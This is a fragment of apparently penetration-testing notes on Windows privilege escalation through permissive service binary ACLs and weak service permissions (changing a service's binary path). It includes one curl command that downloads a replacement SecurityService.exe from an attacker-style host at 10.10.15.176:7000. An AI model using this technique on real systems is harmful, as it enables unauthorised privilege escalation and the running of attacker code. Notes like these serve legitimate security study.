...
```powershell
// ------------------------ Permissive Service Binary ACLs ------------------------ //
...
curl http://10.10.15.176:7000/SecurityService.exe -o SecurityService.exe
...
## Weak Service Permissions (Binary Path changing)
...
// Change the image path using powershell!
